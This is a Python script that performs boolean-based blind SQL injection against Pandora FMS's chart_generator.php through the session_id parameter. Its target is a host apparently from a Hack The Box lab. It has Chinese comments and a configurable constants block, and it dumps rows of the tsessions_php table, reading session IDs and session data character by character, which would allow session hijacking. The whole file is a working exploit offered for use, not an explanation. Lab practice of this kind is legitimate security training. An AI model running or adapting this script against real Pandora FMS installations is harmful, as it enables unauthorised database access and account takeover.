#!/usr/bin/env python3
from sqli_common import BlindBoolClient

# ===================== 常量区（只改这里） =====================
URL = "http://pandora.panda.htb:1443/pandora_console/include/chart_generator.php"
METHOD = "GET"
VERIFY_TLS = False
TIMEOUT = 20
USE_BURP = False
HEADERS = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    # "Cookie": "lang=english; PHPSESSID=ug02hdab6d3qio6g904sdsndo3",
    # "Upgrade-Insecure-Requests": "1",
    }

GET_PARAMS = [
    # ("v", "view_tickets"),
    # ("action", "ticket"),
    # ("param[]", "4"),
    # ("param[]", "attachment"),
    # ("param[]", "1"),
]
POST_DATA = [
    #("username","admin"),
]

INJECT_KEY = "session_id"
BASE_VALUE = "1"
INJECT_TEMPLATE = "{base}' OR ({cond}) AND '1' ='1" 

#INJECT_TEMPLATE = "{base} AND ({cond}) -- -"

FALSE_MARKER = "ccess is not granted"

THREADS = 4
CHARSET = list(range(32, 127))

TABLE = "tsessions_php"
#COL1 = "id"
COL2 = "id_session"
COL3 = "data"
#COL4 = "admin"
START_ROW = 0
MAX_ROWS = 10000
MAX_ROW_STRLEN = 160
# ============================================================

def row_expr(k: int) -> str:
    # username:password
    return f"SELECT CONCAT({COL2},0x3a,{COL3}) FROM {TABLE} LIMIT {k},1"

if __name__ == "__main__":
    cli = BlindBoolClient(
        url=URL, method=METHOD, headers=HEADERS, verify_tls=VERIFY_TLS, timeout=TIMEOUT, use_burp=USE_BURP,
        get_params=GET_PARAMS, post_data=POST_DATA, inject_key=INJECT_KEY, base_value=BASE_VALUE,
        inject_template=INJECT_TEMPLATE, false_marker=FALSE_MARKER, threads=THREADS, charset=CHARSET
    )

    print("[TEST] 1=1:", cli.check("1=1"))
    print("[TEST] 1=2:", cli.check("1=2"))

    print(f"[*] Dumping data from {TABLE} ({COL2}:{COL3}) rows {START_ROW}..{START_ROW+MAX_ROWS-1}")
    for k in range(START_ROW, START_ROW + MAX_ROWS):
        try:
            s = cli.extract(row_expr(k), max_len=MAX_ROW_STRLEN, allow_zero=True, verbose=False)
            print(f"[+] row[{k}] = {s}")
        except RuntimeError as e:
            print(f"[-] stop at row[{k}] ({e})")
            break
